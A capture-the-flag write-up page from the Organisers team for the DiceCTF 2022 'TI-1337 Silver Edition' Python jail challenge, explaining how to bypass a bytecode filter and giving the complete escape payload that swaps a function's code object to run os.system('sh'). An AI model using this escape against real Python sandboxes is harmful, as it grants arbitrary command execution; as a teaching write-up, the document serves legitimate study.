@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>TI-1337 Silver Edition | Organisers</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="TI-1337 Silver Edition" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="CTF Team" />
+<meta property="og:description" content="CTF Team" />
+<link rel="canonical" href="https://org.anize.rs/dicectf-2022/misc/ti1337.html" />
+<meta property="og:url" content="https://org.anize.rs/dicectf-2022/misc/ti1337.html" />
+<meta property="og:site_name" content="Organisers" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="TI-1337 Silver Edition" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"CTF Team","headline":"TI-1337 Silver Edition","url":"https://org.anize.rs/dicectf-2022/misc/ti1337.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+    <meta property="og:image" content="https://org.anize.rs/assets/images/logo.png" />
+    <meta name="twitter:card" content="summary" />
+    <!-- TODO <meta name="twitter:description" content="" /> -->
+    <meta name="twitter:title" content="Organisers" />
+    <meta name="twitter:site" content="@0rganizers" />
+    <!-- TODO <meta name="twitter:image" content="" /> -->
+
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#040d21">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Hack monospace font -->
+    <link rel='stylesheet' href='//cdn.jsdelivr.net/npm/hack-font@3.3.0/build/web/hack.css'>
+    <link rel="stylesheet" href="/assets/css/style.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+    <link rel="stylesheet" href="/assets/css/highlight.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+    <link rel="stylesheet" href="/assets/css/light.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+
+    <!-- legitimize current Mastodon profile via link verification -->
+    <link rel="me" href="https://infosec.exchange/@organizers" />
+
+
+    <script type="text/javascript">
+        function isLightThemeSelected() {
+          return document.cookie.match(/theme=light/i) != null
+        }
+
+        function setThemeFromCookie() {
+            var html = document.getElementsByTagName('html')[0]
+            html.className = isLightThemeSelected() ? 'light-theme' : 'dark-theme'
+            console.log('Loaded cookie: ' + document.cookie)
+        }
+
+        (function() {
+          setThemeFromCookie()
+        })();
+    </script>
+
+    <script type="text/javascript">
+        function getFootnoteContent(linkId) {
+            const fnId = linkId.replace(/^fnref/, 'fn');
+            return document.getElementById(fnId).querySelector("p").innerHTML;
+        }
+
+        function addFootnote(element, content) {
+            const footnote = document.createElement('div');
+            footnote.classList.add('footnote-box');
+            // Also add the footnote number
+            footnote.innerHTML = `<sup>${element.innerText}</sup> ${content}`;
+            footnote.querySelectorAll('a.reversefootnote').forEach((backlink) => {
+                footnote.removeChild(backlink);
+            });
+            element.insertAdjacentElement('afterend', footnote);
+            element.dataset.toggled = '1';
+        }
+
+        function removeFootnote(element) {
+            element.parentElement.removeChild(element.nextSibling);
+            element.dataset.toggled = '0';
+        }
+
+
+        window.addEventListener("load", function() {
+            document.querySelectorAll("a.footnote").forEach((el) => {
+                const sup = el.parentElement;
+                el.addEventListener("click", (event) => {
+                    const isOpen = Number.parseInt(sup.dataset.toggled || '0');
+                    if (!isOpen) {
+                        addFootnote(sup, getFootnoteContent(sup.id));
+                    } else {
+                        removeFootnote(sup);
+                    }
+                    event.preventDefault();
+                });
+            });
+        });
+    </script>
+
+    <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      "HTML-CSS": {
+        fonts: ["Gyre-Pagella"],
+        imageFont: null,
+        undefinedFamily: "'Arial Unicode MS', cmbright"
+      },
+      tex2jax: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']],
+        processEscapes: true
+      }
+    });
+  </script>
+  <script src="https://cdn.jsdelivr.net/npm/mathjax@2/MathJax.js?config=TeX-AMS_HTML"></script>
+  </head>
+  
+  <body> 
+    <header class="page-header-simple" role="banner">
+      
+      <div class="left-links"><a id="header-logo" href="/">Organi{s|z}ers</a></div>
+      <div class="right-links">
+        <a href="/writeups">Writeups</a>
+        <a href="/achievements">Achievements</a>
+      </div>
+    </header>
+
+    <main id="content" class="main-content" role="main">
+      <h1 id="ti-1337-silver-edition">TI-1337 Silver Edition</h1>
+
+<p><strong>Authors:</strong> Robin_Jadoul</p>
+
+<p><strong>Tags:</strong> misc, pyjail</p>
+
+<p><strong>Points:</strong> 299 (13 solves)</p>
+
+<p><strong>Challenge Author:</strong> kmh</p>
+
+<p><strong>Description:</strong>
+Back in the day the silver edition was the top of the line Texas Instruments calculator, but now the security is looking a little obsolete. Can you break it?</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span><span class="kn">import</span> <span class="nn">dis</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">banned</span> <span class="o">=</span> <span class="p">[</span><span class="s">"MAKE_FUNCTION"</span><span class="p">,</span> <span class="s">"CALL_FUNCTION"</span><span class="p">,</span> <span class="s">"CALL_FUNCTION_KW"</span><span class="p">,</span> <span class="s">"CALL_FUNCTION_EX"</span><span class="p">]</span>
+
+<span class="n">used_gift</span> <span class="o">=</span> <span class="bp">False</span>
+
+<span class="k">def</span> <span class="nf">gift</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
+	<span class="k">global</span> <span class="n">used_gift</span>
+	<span class="k">if</span> <span class="n">used_gift</span><span class="p">:</span> <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+	<span class="n">used_gift</span> <span class="o">=</span> <span class="bp">True</span>
+	<span class="nb">setattr</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s">"Welcome to the TI-1337 Silver Edition. Enter your calculations below:"</span><span class="p">)</span>
+
+<span class="n">math</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
+<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">math</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1337</span><span class="p">:</span>
+	<span class="k">print</span><span class="p">(</span><span class="s">"Nobody needs that much math!"</span><span class="p">)</span>
+	<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">code</span> <span class="o">=</span> <span class="nb">compile</span><span class="p">(</span><span class="n">math</span><span class="p">,</span> <span class="s">"&lt;math&gt;"</span><span class="p">,</span> <span class="s">"exec"</span><span class="p">)</span>
+
+<span class="n">bytecode</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">code</span><span class="p">.</span><span class="n">co_code</span><span class="p">)</span>
+<span class="n">instructions</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">dis</span><span class="p">.</span><span class="n">get_instructions</span><span class="p">(</span><span class="n">code</span><span class="p">))</span>
+<span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">inst</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">instructions</span><span class="p">):</span>
+	<span class="k">if</span> <span class="n">inst</span><span class="p">.</span><span class="n">is_jump_target</span><span class="p">:</span>
+		<span class="k">print</span><span class="p">(</span><span class="s">"Math doesn't need control flow!"</span><span class="p">)</span>
+		<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+	<span class="n">nextoffset</span> <span class="o">=</span> <span class="n">instructions</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">].</span><span class="n">offset</span> <span class="k">if</span> <span class="n">i</span><span class="o">+</span><span class="mi">1</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">instructions</span><span class="p">)</span> <span class="k">else</span> <span class="nb">len</span><span class="p">(</span><span class="n">bytecode</span><span class="p">)</span>
+	<span class="k">if</span> <span class="n">inst</span><span class="p">.</span><span class="n">opname</span> <span class="ow">in</span> <span class="n">banned</span><span class="p">:</span>
+		<span class="n">bytecode</span><span class="p">[</span><span class="n">inst</span><span class="p">.</span><span class="n">offset</span><span class="p">:</span><span class="n">instructions</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">].</span><span class="n">offset</span><span class="p">]</span> <span class="o">=</span> <span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">*</span><span class="p">(</span><span class="n">instructions</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">].</span><span class="n">offset</span><span class="o">-</span><span class="n">inst</span><span class="p">.</span><span class="n">offset</span><span class="p">)</span>
+
+<span class="n">names</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">code</span><span class="p">.</span><span class="n">co_names</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">name</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">code</span><span class="p">.</span><span class="n">co_names</span><span class="p">):</span>
+	<span class="k">if</span> <span class="s">"__"</span> <span class="ow">in</span> <span class="n">name</span><span class="p">:</span> <span class="n">names</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="s">"$INVALID$"</span>
+
+<span class="n">code</span> <span class="o">=</span> <span class="n">code</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="n">co_code</span><span class="o">=</span><span class="nb">bytes</span><span class="p">(</span><span class="n">b</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">bytecode</span> <span class="k">if</span> <span class="n">b</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">),</span> <span class="n">co_names</span><span class="o">=</span><span class="nb">tuple</span><span class="p">(</span><span class="n">names</span><span class="p">),</span> <span class="n">co_stacksize</span><span class="o">=</span><span class="mi">2</span><span class="o">**</span><span class="mi">20</span><span class="p">)</span>
+<span class="n">v</span> <span class="o">=</span> <span class="p">{}</span>
+<span class="k">exec</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="p">{</span><span class="s">"__builtins__"</span><span class="p">:</span> <span class="p">{</span><span class="s">"gift"</span><span class="p">:</span> <span class="n">gift</span><span class="p">}},</span> <span class="n">v</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">v</span><span class="p">:</span> <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">name</span><span class="si">}</span><span class="s"> = </span><span class="si">{</span><span class="n">val</span><span class="si">}</span><span class="s">"</span> <span class="k">for</span> <span class="n">name</span><span class="p">,</span> <span class="n">val</span> <span class="ow">in</span> <span class="n">v</span><span class="p">.</span><span class="n">items</span><span class="p">()))</span>
+<span class="k">else</span><span class="p">:</span> <span class="k">print</span><span class="p">(</span><span class="s">"No results stored."</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h2 id="a-high-horse-level-overview">A high <del>horse</del> level overview</h2>
+
+<p>Let’s have a look at the restrictions on our payload:</p>
+
+<ul>
+  <li>We can perform a single call to the function <code class="language-plaintext highlighter-rouge">gift</code> which simply delegates to <code class="language-plaintext highlighter-rouge">setattr</code></li>
+  <li>length &lt; 1337, that seems fairly generous</li>
+  <li>No control flow, at all, if <code class="language-plaintext highlighter-rouge">dis</code> thinks we’re jumping somewhere, it kills us</li>
+  <li>No making any functions or calling them; observe that the instruction is stripped, rather than the entire payload being killed</li>
+  <li>Anything that smells like a <em>dunder</em> method is renamed to be <code class="language-plaintext highlighter-rouge">$INVALID$</code> instead</li>
+  <li>No builtins, only the gift</li>
+  <li>Whatever we assign to will be printed upon exit</li>
+</ul>
+
+<h2 id="looking-a-gift-horse-function-into-the-mouth">Looking a <code class="language-plaintext highlighter-rouge">gift</code> <del>horse</del> function into the mouth</h2>
+
+<p>One of the very first observations we can make: we have a function we can call, except… we shouldn’t be able to call any functions at all.
+Curious.</p>
+
+<p>Let’s have a scroll through (the documentation for<sup id="fnref:docs" role="doc-noteref"><a href="#fn:docs" class="footnote" rel="footnote">1</a></sup>) the most useful resource for this challenge: <a href="https://docs.python.org/3.9/library/dis.html">the <code class="language-plaintext highlighter-rouge">dis</code> module</a>.
+Maybe we can even perform a search for <code class="language-plaintext highlighter-rouge">CALL</code>.
+And behold, there appears an instruction that isn’t blocked, but that appears useful: <code class="language-plaintext highlighter-rouge">CALL_METHOD</code>.</p>
+
+<blockquote>
+  <p>This opcode is designed to be used with <code class="language-plaintext highlighter-rouge">LOAD_METHOD</code></p>
+</blockquote>
+
+<p>So then how can we get <code class="language-plaintext highlighter-rouge">LOAD_METHOD</code> to be executed?
+A method is loaded when we try to call something that looks like a method: a <em>dotted</em> name.
+So if we can get a call to something like <code class="language-plaintext highlighter-rouge">x.y()</code>, that should give us a function call we so sorely need.
+If only we had something to assign attributes too…
+Oh, we have <code class="language-plaintext highlighter-rouge">gift</code>, you say?
+Indeed, simply assigning to <code class="language-plaintext highlighter-rouge">gift.gift = gift</code> allows us to call <code class="language-plaintext highlighter-rouge">gift.gift(target, name, value)</code>.</p>
+
+<p>With that out of the way, let’s see what we can try to <code class="language-plaintext highlighter-rouge">setattr</code>.</p>
+
+<h2 id="swapping-horses-code-midstream">Swapping <del>horses</del> code midstream</h2>
+
+<p>Given that we have no access to special methods and variables at all currently, it would make sense to target one of those with our one call to <code class="language-plaintext highlighter-rouge">setattr</code>.
+We could try to overwrite <code class="language-plaintext highlighter-rouge">gift.__globals__</code> in order to get more calls to <code class="language-plaintext highlighter-rouge">gift</code>, but unfortunately, that’s a readonly attribute.</p>
+
+<p>Looking through every attribute that’s available on this so-called gift, we notice that <code class="language-plaintext highlighter-rouge">gift.__builtins__</code> refers to the original builtins.
+If we could somehow hijack control of gift’s execution, or access that attribute; we could gain back control and quickly escalate to shell.
+The question remains, how can we achieve that.</p>
+
+<p>And that question is answered only a few entries later in <code class="language-plaintext highlighter-rouge">dir(gift)</code>: <code class="language-plaintext highlighter-rouge">gift.__code__</code> is writable.
+If we could somehow construct and a handle to a code object that does what we tell it to do, we could have it run with access to the real builtins, and stand triumphant with this dead calculator at our feet.</p>
+
+<h2 id="my-kingdom-for-a-horse-code-object">My kingdom for a <del>horse</del> code object</h2>
+
+<p>How does one generally go about creating code objects?
+Obviously there’s the constructor, but given that we can’t get access to that type to call it, that’s out of the question.
+Code objects, interestingly also get created when we try to make a function.</p>
+
+<p>Now you might start interrupting and say something like <em>“but we can’t make functions, and even if we could, we can’t access a function’s <code class="language-plaintext highlighter-rouge">__code__</code>“</em>, which is of course very true, but also entirely besides the question.
+All we need is the code object on the execution stack.</p>
+
+<p>Let’s have a look at what instructions get executed when we try to create a function:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt;&gt;&gt; import dis
+&gt;&gt;&gt; dis.dis(compile("""def x(): pass""", "", "exec"))
+  1           0 LOAD_CONST               0 (&lt;code object x at 0x7fb5838856e0, file "", line 1&gt;)
+              2 LOAD_CONST               1 ('x')
+              4 MAKE_FUNCTION            0
+              6 STORE_NAME               0 (x)
+              8 LOAD_CONST               2 (None)
+             10 RETURN_VALUE
+
+Disassembly of &lt;code object x at 0x7fb5838856e0, file "", line 1&gt;:
+  1           0 LOAD_CONST               0 (None)
+              2 RETURN_VALUE
+</code></pre></div></div>
+
+<p>Now just imagine that <code class="language-plaintext highlighter-rouge">MAKE_FUNCTION</code> gone, and we’re left with an interesting value on the stack.
+Similarly, when we try to do this with a lambda:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt;&gt;&gt; dis.dis(compile("""x = lambda: 0""", "", "exec"))
+  1           0 LOAD_CONST               0 (&lt;code object &lt;lambda&gt; at 0x7fb5838858f0, file "", line 1&gt;)
+              2 LOAD_CONST               1 ('&lt;lambda&gt;')
+              4 MAKE_FUNCTION            0
+              6 STORE_NAME               0 (x)
+              8 LOAD_CONST               2 (None)
+             10 RETURN_VALUE
+
+Disassembly of &lt;code object &lt;lambda&gt; at 0x7fb5838858f0, file "", line 1&gt;:
+  1           0 LOAD_CONST               1 (0)
+              2 RETURN_VALUE
+</code></pre></div></div>
+
+<p>Imagine the <code class="language-plaintext highlighter-rouge">MAKE_FUNCTION</code> gone again, and we’d almost even directly assign this code object to a variable we could reference.
+Only that pesky name is in the way, grrrr.</p>
+
+<p>Now it comes to massaging the stack a bit and actually getting our hands on the code object.
+The intended solution here becomes fairly tricky and combines <code class="language-plaintext highlighter-rouge">EXTENDED_ARG</code> (used for the number of arguments to a function) with <code class="language-plaintext highlighter-rouge">BUILD_MAP</code> to read past the stack, but we shall take a simpler route here.</p>
+
+<p>After experimenting with tuple unpacking,<sup id="fnref:tuples" role="doc-noteref"><a href="#fn:tuples" class="footnote" rel="footnote">2</a></sup> we observe that the following code is fairly interesting:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt;&gt;&gt; dis.dis(compile("""x = (y, z)""", "", "exec"))
+  1           0 LOAD_NAME                0 (y)
+              2 LOAD_NAME                1 (z)
+              4 BUILD_TUPLE              2
+              6 STORE_NAME               2 (x)
+              8 LOAD_CONST               0 (None)
+             10 RETURN_VALUE
+</code></pre></div></div>
+
+<p>More specifically, <code class="language-plaintext highlighter-rouge">BUILD_TUPLE(2)</code> takes the topmost 2 elements from the stack, and puts them into a tuple.
+If we now would happen to have not <code class="language-plaintext highlighter-rouge">z</code>, but <code class="language-plaintext highlighter-rouge">"&lt;lambda&gt;"</code> and a code object on the stack, poor <code class="language-plaintext highlighter-rouge">y</code> would get ignored, and we’d get a way more interesting tuple instead:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt;&gt;&gt; dis.dis(compile("""x = (0, lambda: None)""", "", "exec"))
+  1           0 LOAD_CONST               0 (0)
+              2 LOAD_CONST               1 (&lt;code object &lt;lambda&gt; at 0x7fb5838858f0, file "", line 1&gt;)
+              4 LOAD_CONST               2 ('&lt;lambda&gt;')
+              6 MAKE_FUNCTION            0
+              8 BUILD_TUPLE              2
+             10 STORE_NAME               0 (x)
+             12 LOAD_CONST               3 (None)
+             14 RETURN_VALUE
+
+Disassembly of &lt;code object &lt;lambda&gt; at 0x7fb5838858f0, file "", line 1&gt;:
+  1           0 LOAD_CONST               0 (None)
+              2 RETURN_VALUE
+</code></pre></div></div>
+
+<p>Simply access this tuple at index 0, and we have reached our destination.</p>
+
+<h2 id="flagging-a-dead-horse">Flagging a dead horse</h2>
+
+<p>It’s only a matter of putting everything together from here on out.
+We want to:</p>
+
+<ul>
+  <li>Create a code object that gives us a shell</li>
+  <li>Assign it to <code class="language-plaintext highlighter-rouge">gift.__code__</code> by calling <code class="language-plaintext highlighter-rouge">gift</code></li>
+  <li>Call the all new and improved <code class="language-plaintext highlighter-rouge">gift</code> again to get our sweet shell</li>
+</ul>
+
+<p>So, let’s do exactly that.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># step 1
+</span><span class="n">c</span> <span class="o">=</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="k">lambda</span><span class="p">:</span> <span class="nb">__import__</span><span class="p">(</span><span class="s">'os'</span><span class="p">).</span><span class="n">system</span><span class="p">(</span><span class="s">'sh'</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span>
+
+<span class="c1"># step 2
+</span><span class="n">gift</span><span class="p">.</span><span class="n">x</span> <span class="o">=</span> <span class="n">gift</span>
+<span class="n">gift</span><span class="p">.</span><span class="n">x</span><span class="p">(</span><span class="n">gift</span><span class="p">,</span> <span class="s">"__code__"</span><span class="p">,</span> <span class="n">c</span><span class="p">)</span>
+
+<span class="c1"># step 3
+</span><span class="n">gift</span><span class="p">.</span><span class="n">x</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>One more interesting fact here is that we can use the <code class="language-plaintext highlighter-rouge">__import__</code> name without problem, since the code object is a constant, and not strictly part of the instructions/names of the code object being cleaned by the jail.</p>
+
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge">dice{i_sh0uldve_upgr4ded_to_th3_color_edit10n}</code></p>
+</blockquote>
+
+<p>I generally like pyjail escapes, and this one was definitely no exception.
+It probably was one of the most fun ones I’ve done in a while, so thanks for that, kmh :)</p>
+
+<hr />
+<div class="footnotes" role="doc-endnotes">
+  <ol>
+    <li id="fn:docs" role="doc-endnote">
+      <p>It’s really hard to decide what’s more the MVP here, the <code class="language-plaintext highlighter-rouge">dis</code> module, or its documentation that contains an overview of all these juicy instructions. <a href="#fnref:docs" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
+    </li>
+    <li id="fn:tuples" role="doc-endnote">
+      <p>And completely missing the fact that python optimizes out the tuple packing and unpacking if we have 2 items on both sides of the <code class="language-plaintext highlighter-rouge">=</code>. Rather than packing, unpacking and crashing because the number of elements isn’t right, <code class="language-plaintext highlighter-rouge">x,y = 0, lambda: None</code> simply gets compiled to a few <code class="language-plaintext highlighter-rouge">LOAD</code>s, a <code class="language-plaintext highlighter-rouge">ROT</code> and two <code class="language-plaintext highlighter-rouge">STORE</code>s. An even quicker solution than what we end up doing next. <a href="#fnref:tuples" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
+    </li>
+  </ol>
+</div>
+
+
+
+
+<!--       <footer class="site-footer">
+        <a href="https://twitter.com/0rganizers">Twitter</a> | <a id="changeTheme" class="btn-toggle">Dark-Mode</a>
+      </footer> -->
+
+      <div class="lever-meme">
+        <div id="lever" class="lever-off"></div>
+      </div>
+
+      <div class="twitter">
+        <a href="https://twitter.com/0rganizers"><img src="/assets/images/twitter.svg"></a>
+      </div>
+
+      <script>
+        let leverCount = 0;
+        let manic = false;
+
+        function resetLever() {
+            leverCount = 0;
+            setTimeout(resetLever, 1750);
+        }
+
+        resetLever();
+
+        document.getElementById('lever')
+        .addEventListener('click', function (event) {
+          if(leverCount > 10){
+            manic = true;
+            document.getElementById("lever").classList.add('lever-manic');
+            document.getElementById("header-logo").classList.add('rainbow');
+          }
+
+          if(!manic){
+            document.getElementById("lever").classList.toggle('lever-on');
+            ++leverCount;
+          }
+        });
+
+
+      </script>
+
+      <script>
+      function updateThemeToggleFooter() {
+        let elem = document.querySelector('#lever');
+        // elem.innerHTML = isLightThemeSelected() ? 'Dark Mode' : 'Light Mode'
+      }
+
+      (function() {
+        updateThemeToggleFooter()
+      })();
+
+      function togglePageContentLightDark() {
+          var html = document.getElementsByTagName('html')[0]
+          var currentClass = html.className
+          var newClass = html.className == 'dark-theme' ? 'light-theme' : 'dark-theme'
+          html.className = newClass
+
+          document.cookie = 'theme=' + (newClass == 'light-theme' ? 'light' : 'dark') + '; SameSite=Strict; path=/; expires=Fri, 31 Dec 9999 23:59:59 GMT'
+          console.log('Cookies are now: ' + document.cookie)
+
+          updateThemeToggleFooter()
+      }
+
+      const btn = document.querySelector("#lever");
+      btn.addEventListener("click", function() {
+        togglePageContentLightDark();
+      });
+      </script>
+    </main>
+  </body>
+</html>
